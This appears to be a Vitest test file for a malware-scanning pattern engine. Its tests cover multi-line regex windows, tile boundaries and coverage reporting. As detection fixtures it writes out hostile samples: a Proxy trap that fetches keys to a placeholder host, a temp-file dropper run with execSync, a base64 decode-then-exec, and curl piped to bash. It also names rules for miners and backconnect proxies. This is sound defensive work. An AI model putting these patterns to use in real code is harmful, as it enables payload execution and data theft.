import { describe, it, expect } from "vitest";
import { performanceBudget } from "./performance-budget.js";
import {
  matchPatternInContent,
  validatePatternSet,
  truncateMatch,
  MAX_SPANS_LINES,
  MAX_SPAN_WINDOW_CHARS,
  MAX_MATCH_ATTEMPTS_PER_PATTERN,
  MAX_PHYSICAL_LINES_PER_PATTERN,
  PATTERN_TILE_OVERLAP_CHARS,
  OBFUSCATION_PATTERNS_V2,
  INFOSTEALER_PATTERNS,
  PYPI_FILE_PATTERNS,
  ALL_PATTERN_SETS,
} from "../patterns.js";
import type { PatternEntry } from "../types.js";

/**
 * Unit tests for the bounded multi-line pattern engine.
 *
 * These pin window boundaries, start-line mapping, pathological-input
 * transparency and the opt-in default (spansLines undefined => single-line).
 */

const proxyRule = OBFUSCATION_PATTERNS_V2.find((p) => p.rule === "PROXY_HANDLER_TRAP")!;
const dropperRule = INFOSTEALER_PATTERNS.find((p) => p.rule === "DROPPER_TEMP_EXEC")!;
const proxyBackconnectRule = INFOSTEALER_PATTERNS.find((p) => p.rule === "PROXY_BACKCONNECT")!;
const b64Rule = PYPI_FILE_PATTERNS.find((p) => p.rule === "PYPI_B64_EXEC_COMBINED")!;
const shippedRule = (rule: string): PatternEntry => {
  const entry = ALL_PATTERN_SETS.flatMap(([, set]) => set).find((candidate) => candidate.rule === rule);
  if (!entry) throw new Error(`Missing shipped rule: ${rule}`);
  return entry as PatternEntry;
};

describe("matchPatternInContent", () => {
  it("defaults to single-line behaviour when spansLines is unset", () => {
    const pattern: Pick<PatternEntry, "pattern" | "spansLines"> = {
      pattern: "foo.*bar",
    };
    const content = "foo\nbar\n";
    expect(matchPatternInContent(pattern, content)).toEqual([]);
    expect(matchPatternInContent(pattern, "foo bar\n")).toHaveLength(1);
  });

  it.each([500, 501, 1200])(
    "retains complete single-line coverage through line %i",
    (targetLine) => {
      const lines = Array.from(
        { length: targetLine },
        (_, index) => index === targetLine - 1 ? "TAIL_TRIGGER" : `const p${index} = 0;`,
      );
      const hits = matchPatternInContent({ pattern: "TAIL_TRIGGER" }, lines.join("\n"));

      expect(hits).toHaveLength(1);
      expect(hits[0]!.line).toBe(targetLine);
      expect(hits.coverage.complete).toBe(true);
      expect(hits.coverage.limitations).toEqual([]);
    },
  );

  it("retains multi-line coverage after line 1200", () => {
    const lines = Array.from({ length: 1205 }, (_, index) => `const p${index} = 0;`);
    lines[1200] = "ALPHA";
    lines[1201] = "OMEGA";
    const hits = matchPatternInContent(
      { pattern: "ALPHA.*OMEGA", spansLines: 2 },
      lines.join("\n"),
    );

    expect(hits).toHaveLength(1);
    expect(hits[0]!.line).toBe(1201);
    expect(hits.coverage.complete).toBe(true);
  });

  it("detects PROXY_HANDLER_TRAP when hostile behaviour is inside a pretty-printed trap", () => {
    const multi = `const p = new Proxy(target, {
  get: (t, k) => { fetch("https://x.invalid/?k=" + k); return t[k]; },
});
`;
    const hits = matchPatternInContent(proxyRule, multi, "g");
    expect(hits.length).toBeGreaterThanOrEqual(1);
    expect(hits[0]!.line).toBe(1);
  });

  it("still detects the hostile one-line PROXY form", () => {
    const one =
      'const p = new Proxy(target, { get: (t, k) => { fetch("https://x.invalid/?k=" + k); return t[k]; } });\n';
    const hits = matchPatternInContent(proxyRule, one, "g");
    expect(hits).toHaveLength(1);
    expect(hits[0]!.line).toBe(1);
  });

  it("dispatches a shipped structural matcher beyond the old 4096-character cap", () => {
    const padding = "const filler = 0;".repeat(400);
    const content = `${padding}const p = new Proxy(target, { get: (obj, key) => { fetch(key); return obj[key]; } });`;
    const hits = matchPatternInContent(proxyRule, content, "g");

    expect(content.indexOf("new Proxy")).toBeGreaterThan(MAX_SPAN_WINDOW_CHARS);
    expect(hits).toHaveLength(1);
    expect(hits[0]!.line).toBe(1);
    expect(hits.coverage.complete).toBe(true);
    expect(hits.coverage.limitations).toEqual([]);
    expect(hits.coverage.tiledRanges).toBe(0);
  });
  it("reports the line where a toy match STARTS, not the window start", () => {
    const pattern: Pick<PatternEntry, "pattern" | "spansLines"> = {
      pattern: "BEGIN.*TRAP",
      spansLines: 3,
    };
    const content = `// pad 1
// pad 2
// pad 3
BEGIN
TRAP
`;
    const hits = matchPatternInContent(pattern, content, "g");
    expect(hits).toHaveLength(1);
    expect(hits[0]!.line).toBe(4);
  });

  it("fires when a toy match spans exactly spansLines lines", () => {
    const pattern: Pick<PatternEntry, "pattern" | "spansLines"> = {
      pattern: "ALPHA.*OMEGA",
      spansLines: 5,
    };
    const content = ["ALPHA", "// a", "// b", "// c", "OMEGA", ""].join("\n");
    const hits = matchPatternInContent(pattern, content, "g");
    expect(hits).toHaveLength(1);
    expect(hits[0]!.line).toBe(1);
  });

  it("does NOT fire when a match needs one line more than spansLines", () => {
    const pattern: Pick<PatternEntry, "pattern" | "spansLines"> = {
      pattern: "ALPHA.*OMEGA",
      spansLines: 2,
    };
    const tooFar = "ALPHA\nmiddle\nOMEGA\n";
    expect(matchPatternInContent(pattern, tooFar, "g")).toEqual([]);

    const adjacent = "ALPHA\nOMEGA\n";
    expect(matchPatternInContent(pattern, adjacent, "g")).toHaveLength(1);
  });

  it("detects DROPPER_TEMP_EXEC split across correlated write and exec lines", () => {
    const content = `const os = require("os");
const fs = require("fs");
const { execSync } = require("child_process");
const dest = os.tmpdir() + "/p.exe";
fs.writeFileSync(dest, Buffer.from(payload, "base64"));
execSync(dest);
`;
    const hits = matchPatternInContent(dropperRule, content, "g");
    expect(hits.length).toBeGreaterThanOrEqual(1);
  });

  it("detects PYPI_B64_EXEC_COMBINED across decode then exec", () => {
    const content = `import base64
payload = base64.b64decode(blob)
exec(payload)
`;
    const hits = matchPatternInContent(b64Rule, content, "g");
    expect(hits.length).toBeGreaterThanOrEqual(1);
  });

  it("applies valueFilter and drops rejected matches", () => {
    const pattern: Pick<PatternEntry, "pattern" | "spansLines" | "valueFilter" | "valueGroup"> = {
      pattern: "key=([A-Z]+)",
      valueGroup: 1,
      valueFilter: (v) => v.length >= 8,
    };
    expect(matchPatternInContent(pattern, "key=SHORT\n", "g")).toEqual([]);
    expect(matchPatternInContent(pattern, "key=LONGVALUE\n", "g")).toHaveLength(1);
  });

  it("continues after a rejected valueFilter candidate on the same line", () => {
    const pattern: Pick<PatternEntry, "pattern" | "valueFilter" | "valueGroup"> = {
      pattern: "key=([A-Z]+)",
      valueGroup: 1,
      valueFilter: (value) => value.length >= 8,
    };
    const hits = matchPatternInContent(
      pattern,
      "key=SHORT key=LONGVALUE\n",
      "g",
    );

    expect(hits).toHaveLength(1);
    expect(hits[0]!.text).toBe("key=LONGVALUE");
  });
  it("honours skipLine for comment lines (config-scanner shape)", () => {
    const pattern: Pick<PatternEntry, "pattern" | "spansLines"> = {
      pattern: "token\\s*=\\s*secret",
    };
    const content = "# token = secret\ntoken = secret\n";
    const hits = matchPatternInContent(pattern, content, "i", {
      skipLine: (line) => line.trimStart().startsWith("#"),
    });
    expect(hits).toHaveLength(1);
    expect(hits[0]!.line).toBe(2);
  });

  it("dedupes overlapping multi-line windows to one hit per start line", () => {
    const pattern: Pick<PatternEntry, "pattern" | "spansLines"> = {
      pattern: "foo.*bar",
      spansLines: 3,
    };
    const content = "foo\nx\nbar\n";
    const hits = matchPatternInContent(pattern, content, "g");
    expect(hits).toHaveLength(1);
  });

  it("finds a late single-line trigger with bounded regex tiles", () => {
    const content = `${"x".repeat(MAX_SPAN_WINDOW_CHARS + 200)}LATE_TRIGGER`;
    const hits = matchPatternInContent({ pattern: "LATE_TRIGGER" }, content, "g");

    expect(hits).toHaveLength(1);
    expect(hits[0]!.line).toBe(1);
    expect(hits.coverage.complete).toBe(false);
    expect(hits.coverage.limitations).toContain("overlong-range-tiled");
    expect(hits.coverage.tiledRanges).toBe(1);
  });

  it("evaluates a load-validated safe one-line regex exactly on a 5 MiB line", () => {
    const pattern = { pattern: "LATE_TRIGGER", rule: "VALIDATED_LATE_TRIGGER" };
    validatePatternSet("VALIDATED_TEST", [pattern]);
    const content = `${"x".repeat((5 * 1024 * 1024) - 20)}LATE_TRIGGER`;
    const hits = matchPatternInContent(pattern, content, "g");

    expect(hits).toHaveLength(1);
    expect(hits[0]!.line).toBe(1);
    expect(hits.coverage.complete).toBe(true);
    expect(hits.coverage.limitations).toEqual([]);
    expect(hits.coverage.tiledRanges).toBe(0);
    expect(hits.coverage.regexAttempts).toBe(1);
  });

  it("does not grant exact shared-engine execution to specialized validators", () => {
    const pattern = { pattern: "SPECIALIZED_TRIGGER", rule: "SPECIALIZED_TRIGGER" };
    validatePatternSet("SPECIALIZED_TEST", [pattern], {
      execution: "specialized-engine",
    });
    const content = `${"x".repeat(MAX_SPAN_WINDOW_CHARS + 200)}SPECIALIZED_TRIGGER`;
    const hits = matchPatternInContent(pattern, content, "g");

    expect(hits).toHaveLength(1);
    expect(hits.coverage.complete).toBe(false);
    expect(hits.coverage.limitations).toContain("overlong-range-tiled");
  });

  it("uses exact near-linear coverage for a long proxy near miss", () => {
    const content = "socks5 ".repeat(Math.ceil((256 * 1024) / 7));
    const hits = matchPatternInContent(proxyBackconnectRule, content, "i");

    expect(hits).toHaveLength(0);
    expect(hits.coverage.complete).toBe(true);
    expect(hits.coverage.limitations).toEqual([]);
    expect(hits.coverage.regexAttempts).toBe(1);
  });

  it("does not let $ treat an interior tile boundary as end-of-line", () => {
    const ownedEnd = MAX_SPAN_WINDOW_CHARS - 2 - PATTERN_TILE_OVERLAP_CHARS;
    const artificialEnd = MAX_SPAN_WINDOW_CHARS - 1;
    const curlStart = ownedEnd - 1;
    const extensionStart = artificialEnd - ".exe".length;
    const content =
      "x".repeat(curlStart) +
      "curl " +
      "a".repeat(extensionStart - curlStart - "curl ".length) +
      ".exeX" +
      "z".repeat(200);
    const pattern = {
      pattern: '(?:curl|wget)\\s+.*\\.(?:exe)(?:\\s|$|["\\\'])',
      spansLines: 2,
    };

    expect(new RegExp(pattern.pattern, "g").test(content)).toBe(false);
    const hits = matchPatternInContent(pattern, content, "g");
    expect(hits).toEqual([]);
    expect(hits.coverage.complete).toBe(false);
    expect(hits.coverage.limitations).toContain("overlong-range-tiled");
  });

  it("does not let a zero-width lookahead see synthetic EOF", () => {
    const ownedEnd = MAX_SPAN_WINDOW_CHARS - 2 - PATTERN_TILE_OVERLAP_CHARS;
    const artificialEnd = MAX_SPAN_WINDOW_CHARS - 1;
    const start = ownedEnd - 1;
    const fillerLength = artificialEnd - start - "BEGIN".length - 1;
    const content =
      "x".repeat(start) +
      "BEGIN" +
      "a".repeat(fillerLength) +
      "XYtail";
    const pattern = { pattern: `BEGINa{${fillerLength}}(?=X$)`, spansLines: 2 };

    expect(new RegExp(pattern.pattern, "g").test(content)).toBe(false);
    const hits = matchPatternInContent(pattern, content, "g");
    expect(hits).toEqual([]);
    expect(hits.coverage.complete).toBe(false);
  });

  it("does not let an anchored lookbehind see synthetic tile start", () => {
    const ownedEnd = MAX_SPAN_WINDOW_CHARS - 2 - PATTERN_TILE_OVERLAP_CHARS;
    const content = "z".repeat(ownedEnd - 1) + "xBEGIN" + "z".repeat(3_000);
    const pattern = { pattern: "(?<=^x)BEGIN", spansLines: 2 };

    expect(new RegExp(pattern.pattern, "g").test(content)).toBe(false);
    const hits = matchPatternInContent(pattern, content, "g");
    expect(hits).toEqual([]);
    expect(hits.coverage.complete).toBe(false);
  });
  it("keeps a fixed long match that merely ends at a tile boundary", () => {
    const ownedEnd = MAX_SPAN_WINDOW_CHARS - 2 - PATTERN_TILE_OVERLAP_CHARS;
    const artificialEnd = MAX_SPAN_WINDOW_CHARS - 1;
    const start = ownedEnd - 1;
    const fillerLength = artificialEnd - start - "BEGIN".length - "END".length;
    const token = `BEGIN${"a".repeat(fillerLength)}END`;
    const content = "x".repeat(start) + token + "Xtail";
    const pattern = { pattern: `BEGINa{${fillerLength}}END`, spansLines: 2 };

    expect(new RegExp(pattern.pattern, "g").test(content)).toBe(true);
    const hits = matchPatternInContent(pattern, content, "g");
    expect(hits).toHaveLength(1);
    expect(hits[0]!.text).toBe(token);
    expect(hits.coverage.complete).toBe(false);
  });

  it("uses real-context captures when a boundary probe preserves the full match", () => {
    const ownedEnd = MAX_SPAN_WINDOW_CHARS - 2 - PATTERN_TILE_OVERLAP_CHARS;
    const artificialEnd = MAX_SPAN_WINDOW_CHARS - 1;
    const start = ownedEnd - 1;
    const fillerLength = artificialEnd - start - "MARK".length;
    const token = `MARK${"a".repeat(fillerLength)}`;
    const pattern: Pick<PatternEntry, "pattern" | "spansLines" | "valueFilter" | "valueGroup"> = {
      pattern: `(?:(MARKa{${fillerLength}})\\b|(MARKa{${fillerLength}}))`,
      spansLines: 2,
      valueGroup: 2,
      valueFilter: (value) => value.startsWith("MARK"),
    };
    const content = "x".repeat(start) + token + "Xtail";

    const whole = new RegExp(pattern.pattern, "g").exec(content);
    expect(whole?.[1]).toBeUndefined();
    expect(whole?.[2]).toBe(token);
    const hits = matchPatternInContent(pattern, content, "g");
    expect(hits).toHaveLength(1);
    expect(hits[0]!.match[1]).toBeUndefined();
    expect(hits[0]!.match[2]).toBe(token);
    expect(hits.coverage.complete).toBe(false);
  });

  it("does not let $ use a terminal context newline as synthetic EOF", () => {
    const ownedEnd = MAX_SPAN_WINDOW_CHARS - 2 - PATTERN_TILE_OVERLAP_CHARS;
    const artificialEnd = MAX_SPAN_WINDOW_CHARS - 1;
    const start = ownedEnd - 1;
    const markerStart = artificialEnd - 1 - "END".length;
    const content =
      "x".repeat(start) +
      "BEGIN" +
      "a".repeat(markerStart - start - "BEGIN".length) +
      "END\nXtail";
    const pattern = { pattern: "BEGIN.*END$", spansLines: 2 };

    expect(new RegExp(pattern.pattern, "gs").test(content)).toBe(false);
    expect(matchPatternInContent(pattern, content, "g")).toEqual([]);
  });

  it("preserves late long-line positives for every structuralized rule", () => {
    const long = "x".repeat(6_000);
    const cases: Array<[string, string, string]> = [
      ["SCRIPT_CURL_EXEC", `curl ${long}| bash`, "i"],
      ["SCRIPT_WGET_EXEC", `wget ${long}| node`, "i"],
      ["CODECOV_CURL_BASH", `curl ${long}codecov.io${long}| sh`, "g"],
      ["UAPARSER_MINER", `jsextension${long}curl`, "g"],
      ["BINARY_DIRECT_DOWNLOAD", `curl ${long}.exe `, "i"],
      ["MINER_POOL_DOMAIN", `${long} stratum pool.worker.example.com`, "gi"],
      ["PROXY_BACKCONNECT", `residential${"x".repeat(500)}proxy${"x".repeat(500)}10.20`, "g"],
      ["PROXY_BACKCONNECT", "socks://proxy.invalid:1080", "g"],
    ];

    for (const [rule, content, flags] of cases) {
      const hits = matchPatternInContent(shippedRule(rule), content, flags);
      expect(hits, rule).toHaveLength(1);
      expect(hits[0]!.line, rule).toBe(1);
      expect(hits.coverage.complete, rule).toBe(true);
      expect(hits.coverage.limitations, rule).toEqual([]);
    }
  });

  it("preserves regex semantics at case and line-terminator edges", () => {
    const cases: Array<[string, string, string, number[]]> = [
      ["SCRIPT_CURL_EXEC", "curl\rx|bash", "i", [1]],
      ["SCRIPT_CURL_EXEC", "curl x\u2028|bash", "i", []],
      ["SCRIPT_WGET_EXEC", "WGET x|NODE", "i", [1]],
      ["CODECOV_CURL_BASH", "curl \rcodecov.io|sh", "g", [1]],
      ["CODECOV_CURL_BASH", "Curl codecov.io|sh", "g", []],
      ["UAPARSER_MINER", "jsextension\u2028curl", "g", []],
      ["UAPARSER_MINER", "jsextension curl", "g", [1]],
      ["BINARY_DIRECT_DOWNLOAD", "curl\rx.exe ", "i", [1]],
      ["BINARY_DIRECT_DOWNLOAD", "curl x\u2029.exe ", "i", []],
      ["BINARY_DIRECT_DOWNLOAD", "CURL x.EXE ", "i", [1]],
      ["MINER_POOL_DOMAIN", "mine.net", "gi", []],
      ["MINER_POOL_DOMAIN", "stratum mine.x.net", "gi", [1]],
      ["MINER_POOL_DOMAIN", "xmrig POOL.x.COM", "gi", [1]],
      ["PROXY_BACKCONNECT", "residential\u2028proxy\u202810.20", "g", [1]],
      ["PROXY_BACKCONNECT", "SOCKS5://proxy.invalid", "g", []],
      ["PROXY_BACKCONNECT", "socks://proxy.invalid", "g", [1]],
      ["SCRIPT_CURL_EXEC", "curl x|bash\nno\ncurl y|node", "i", [1, 3]],
    ];

    for (const [rule, content, flags, expectedLines] of cases) {
      const structuralRule = shippedRule(rule);
      const regexRule: PatternEntry = { ...structuralRule, correlatedMatcher: undefined };
      const regexLines = matchPatternInContent(regexRule, content, flags).map((hit) => hit.line);
      const structuralLines = matchPatternInContent(structuralRule, content, flags).map((hit) => hit.line);
      expect(regexLines, `${rule} regex baseline`).toEqual(expectedLines);
      expect(structuralLines, `${rule} structural matcher`).toEqual(regexLines);
    }
  });

  it.each([
    ["SCRIPT_CURL_EXEC", "curl x | bash tail | node", "i"],
    ["SCRIPT_WGET_EXEC", "wget x | sh tail | node", "i"],
    ["CODECOV_CURL_BASH", "curl curl codecov.io codecov.io | sh tail curl codecov.io | bash", "g"],
    ["UAPARSER_MINER", "curl x jsextension.exe y __package.json", "g"],
    ["BINARY_DIRECT_DOWNLOAD", "curl first.exe second.dll ", "i"],
    ["MINER_POOL_DOMAIN", "stratum pool.x.com y.net", "gi"],
    ["PROXY_BACKCONNECT", "residential x residential y proxy z 10.20.30.40", "g"],
    ["PROXY_BACKCONNECT", "socks5:12341.2.3.4", "g"],
    ["PROXY_BACKCONNECT", "residentialproxy:12341.2.3.4", "g"],
  ] as const)(
    "preserves exact leftmost starts and greedy/lazy evidence for %s",
    (rule, content, flags) => {
      const structural = shippedRule(rule);
      const baseline = matchPatternInContent(
        { ...structural, correlatedMatcher: undefined },
        content,
        flags,
      );
      const actual = matchPatternInContent(structural, content, flags);

      expect(baseline, `${rule} baseline`).toHaveLength(1);
      expect(actual.map((hit) => ({
        line: hit.line,
        start: hit.match.index,
        evidence: hit.text,
      })), rule).toEqual(baseline.map((hit) => ({
        line: hit.line,
        start: hit.match.index,
        evidence: hit.text,
      })));
    },
  );

  it("scans concrete 5 MiB repeated-prefix near misses in practical linear time", { timeout: 15_000 }, () => {
    const size = 5 * 1024 * 1024;
    const cases: Array<[string, string, string]> = [
      ["SCRIPT_CURL_EXEC", "curl ", "i"],
      ["SCRIPT_WGET_EXEC", "wget ", "i"],
      ["CODECOV_CURL_BASH", "curl ", "g"],
      ["UAPARSER_MINER", "curl ", "g"],
      ["BINARY_DIRECT_DOWNLOAD", "curl ", "i"],
      ["MINER_POOL_DOMAIN", "pool.", "gi"],
      ["PROXY_BACKCONNECT", "residential proxy ", "g"],
    ];

    const started = Date.now();
    for (const [rule, unit, flags] of cases) {
      const content = unit.repeat(Math.ceil(size / unit.length)).slice(0, size);
      const hits = matchPatternInContent(shippedRule(rule), content, flags);
      expect(hits, rule).toHaveLength(0);
      expect(hits.coverage.complete, rule).toBe(true);
      expect(hits.coverage.regexAttempts, rule).toBe(1);
    }
    expect(Date.now() - started).toBeLessThan(performanceBudget(5_000));
  });

  it("keeps exact greedy/lazy endpoints on 5 MiB repeated completions", { timeout: 15_000 }, () => {
    const size = 5 * 1024 * 1024;
    const cases = [
      ["SCRIPT_CURL_EXEC", "curl x | bash ", "bash", 4, "last"],
      ["SCRIPT_WGET_EXEC", "wget x | node ", "node", 4, "last"],
      ["CODECOV_CURL_BASH", "curl codecov.io | sh ", "sh", 2, "first"],
      ["UAPARSER_MINER", "jsextension curl ", "curl", 4, "last"],
      ["BINARY_DIRECT_DOWNLOAD", "curl x.exe ", ".exe ", 5, "last"],
      ["MINER_POOL_DOMAIN", "pool.x.com stratum ", ".com", 4, "first"],
      ["PROXY_BACKCONNECT", "residential proxy 10.20.30.40 ", "10.20", 5, "first"],
    ] as const;
    const started = Date.now();

    for (const [rule, unit, endpoint, endpointLength, mode] of cases) {
      const content = unit.repeat(Math.floor(size / unit.length));
      const matcher = shippedRule(rule).correlatedMatcher!;
      const found = [...matcher(content)];
      const expectedStart = mode === "first"
        ? content.indexOf(endpoint)
        : content.lastIndexOf(endpoint);

      expect(found, rule).toHaveLength(1);
      expect(found[0]!.start, rule).toBe(0);
      expect(found[0]!.end, rule).toBe(expectedStart + endpointLength);
      expect(found[0]!.evidence.length, rule).toBeLessThanOrEqual(240);

      const hits = matchPatternInContent(shippedRule(rule), content, "i");
      expect(hits, rule).toHaveLength(1);
      expect(hits.coverage.complete, rule).toBe(true);
      expect(hits.coverage.regexAttempts, rule).toBe(1);
    }

    // This scans seven independent 5 MiB inputs twice: once through each
    // structural matcher and once through the public engine. V8 coverage
    // instrumentation is materially slower in these branch-heavy loops, so
    // retain a bounded 70 MiB throughput gate without treating coverage-host
    // overhead as an algorithmic regression.
    expect(Date.now() - started).toBeLessThan(performanceBudget(10_000));
  });

  it("finds a short multi-line match crossing the 4096-character tile boundary", () => {
    const prefix = "x".repeat(MAX_SPAN_WINDOW_CHARS - 6);
    const content = `${prefix}ALPHA\nOMEGA`;
    const hits = matchPatternInContent(
      { pattern: "ALPHA\\s+OMEGA", spansLines: 2 },
      content,
      "g",
    );

    expect(hits).toHaveLength(1);
    expect(hits[0]!.line).toBe(1);
    expect(hits.coverage.complete).toBe(false);
    expect(hits.coverage.limitations).toContain("overlong-range-tiled");
  });

  it("marks an overlong unbounded match as partial when endpoints exceed the overlap", () => {
    const pattern: Pick<PatternEntry, "pattern" | "spansLines"> = {
      pattern: "START[\\s\\S]*ENDMARKER",
      spansLines: 3,
    };
    const pad = "x".repeat(MAX_SPAN_WINDOW_CHARS + PATTERN_TILE_OVERLAP_CHARS);
    const content = `START\n${pad}\nENDMARKER\n`;
    const hits = matchPatternInContent(pattern, content, "g");

    expect(hits).toEqual([]);
    expect(hits.coverage.complete).toBe(false);
    expect(hits.coverage.limitations).toContain("overlong-range-tiled");

    const short = matchPatternInContent(pattern, "START\nshort\nENDMARKER\n", "g");
    expect(short).toHaveLength(1);
    expect(short.coverage.complete).toBe(true);
  });

  it("makes the pathological physical-line ceiling explicit", () => {
    const content = `${"\n".repeat(MAX_PHYSICAL_LINES_PER_PATTERN)}TAIL_TRIGGER`;
    const hits = matchPatternInContent({ pattern: "TAIL_TRIGGER" }, content, "g");

    expect(hits).toEqual([]);
    expect(hits.coverage.complete).toBe(false);
    expect(hits.coverage.limitations).toContain("line-limit");
    expect(hits.coverage.totalLines).toBe(MAX_PHYSICAL_LINES_PER_PATTERN + 1);
    expect(hits.coverage.stoppedAtLine).toBe(MAX_PHYSICAL_LINES_PER_PATTERN + 1);
  });

  it("enforces spansLines on structural matcher results", () => {
    const correlatedMatcher = (content: string) => [{
      start: 0,
      end: content.length,
      evidence: "ALPHA -> OMEGA",
    }];

    const tooFar = matchPatternInContent(
      { pattern: "ALPHA.*OMEGA", spansLines: 2, correlatedMatcher },
      "ALPHA\nmiddle\nOMEGA",
      "g",
    );
    expect(tooFar).toEqual([]);
    expect(tooFar.coverage.complete).toBe(true);

    const adjacent = matchPatternInContent(
      { pattern: "ALPHA.*OMEGA", spansLines: 2, correlatedMatcher },
      "ALPHA\nOMEGA",
      "g",
    );
    expect(adjacent).toHaveLength(1);
    expect(adjacent[0]!.line).toBe(1);
  });

  it("makes malformed structural matcher output explicit", () => {
    const hits = matchPatternInContent(
      {
        pattern: "x",
        spansLines: 2,
        correlatedMatcher: () => [
          { start: -1, end: 1, evidence: "bad offset" },
          { start: 0, end: 1, evidence: "x".repeat(241) },
        ],
      },
      "x",
      "g",
    );

    expect(hits).toEqual([]);
    expect(hits.coverage.complete).toBe(false);
    expect(hits.coverage.limitations).toEqual(["invalid-matcher-result"]);
  });

  it("keeps later rules alive when a structural matcher throws", () => {
    const hits = matchPatternInContent(
      {
        pattern: "x",
        spansLines: 2,
        correlatedMatcher: () => {
          throw new Error("matcher failed");
        },
      },
      "x",
      "g",
    );

    expect(hits).toEqual([]);
    expect(hits.coverage.complete).toBe(false);
    expect(hits.coverage.limitations).toEqual(["matcher-error"]);
  });
  it("makes invalid regex evaluation explicit", () => {
    const hits = matchPatternInContent({ pattern: "[" }, "content", "g");
    expect(hits).toEqual([]);
    expect(hits.coverage.complete).toBe(false);
    expect(hits.coverage.limitations).toEqual(["invalid-pattern"]);
  });

  it("does not pair distant tokens the way whole-file dotAll would", () => {
    const pattern: Pick<PatternEntry, "pattern" | "spansLines"> = {
      pattern: "(?:TEMP|TMP|tmp).*(?:exec|spawn)",
      spansLines: 6,
    };
    const lines: string[] = [];
    for (let i = 0; i < 50; i++) lines.push(`const x${i} = 1;`);
    lines[2] = "const d = os.tmpdir();";
    lines[40] = "execSync('payload');";
    const hits = matchPatternInContent(pattern, lines.join("\n") + "\n", "g");
    expect(hits).toEqual([]);
    expect(hits.coverage.complete).toBe(true);
  });

  it("completes a large multi-line scan within a wall-clock budget", () => {
    const pattern: Pick<PatternEntry, "pattern" | "spansLines"> = {
      pattern: "tmpdir.*execSync",
      spansLines: 6,
    };
    const lines: string[] = [];
    for (let i = 0; i < 5000; i++) {
      lines.push(`const v${i} = ${i};`);
    }
    lines[10] = "const d = os.tmpdir();";
    lines[12] = "execSync(d);";
    lines[4000] = "execSync('far');";

    const started = Date.now();
    const hits = matchPatternInContent(pattern, lines.join("\n") + "\n", "g");
    const elapsed = Date.now() - started;

    expect(hits).toHaveLength(1);
    expect(hits[0]!.line).toBe(11);
    expect(hits.coverage.complete).toBe(true);
    expect(elapsed).toBeLessThan(performanceBudget(5000));
  });

  it("exports hard caps that keep individual regex work bounded", () => {
    expect(MAX_SPANS_LINES).toBeLessThanOrEqual(20);
    expect(MAX_SPAN_WINDOW_CHARS).toBeLessThanOrEqual(8192);
    expect(PATTERN_TILE_OVERLAP_CHARS).toBeLessThan(MAX_SPAN_WINDOW_CHARS);
    expect(MAX_PHYSICAL_LINES_PER_PATTERN).toBeGreaterThan(1200);
    expect(MAX_MATCH_ATTEMPTS_PER_PATTERN).toBeGreaterThanOrEqual(
      MAX_PHYSICAL_LINES_PER_PATTERN,
    );
  });
});

describe("truncateMatch", () => {
  it("collapses multi-line match text so SARIF stays one line", () => {
    const raw = "new Proxy(target, {\n  get: (t, k) => t[k],\n})";
    const out = truncateMatch(raw, 120);
    expect(out.includes("\n")).toBe(false);
    expect(out.length).toBeLessThanOrEqual(123);
  });

  it("does not truncate short matches", () => {
    expect(truncateMatch("new Proxy(t, { get:")).toBe("new Proxy(t, { get:");
  });

  it("renders invisible Unicode evidence as readable code points", () => {
    expect(truncateMatch("\u200B\u2060\uFEFF")).toBe("<U+200B><U+2060><U+FEFF>");
    expect(truncateMatch("\u2028")).toBe("<U+2028>");
  });

  it("never returns an empty snippet for invisible-only evidence", () => {
    expect(truncateMatch("\n\t")).toBe("<invisible Unicode>");
  });
});
